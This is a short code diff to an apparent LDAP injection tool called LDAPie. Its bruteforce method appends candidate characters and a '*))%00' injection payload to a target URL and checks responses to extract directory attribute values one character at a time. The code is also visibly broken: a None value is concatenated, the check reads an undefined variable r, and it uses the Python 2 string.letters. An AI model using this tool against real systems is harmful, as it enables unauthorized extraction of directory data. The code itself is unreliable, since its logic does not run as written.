@@ -66,15 +66,16 @@ class LDAPie:
 
     def bruteforce(self,inj,user,url):
         val = None
+        user = sys.argv[5]
         char = string.letters+string.digits+"""~!@#$%^&*()`-_=+[{]}\|;:'",<.>/?"""
         url = sys.argv[7]
         for i in range(1,100):
             for x in char:
                 bf = requests.get(url+inj+val+x+"*))%00")
                 print(bf)
-    if user in r.content:
-        val += x
-        print("The Value For "+inj+" is "+val)
+            if user in r.content:
+                val += x
+                print("The Value For "+inj+" is "+val)
 #        break
 
 #main
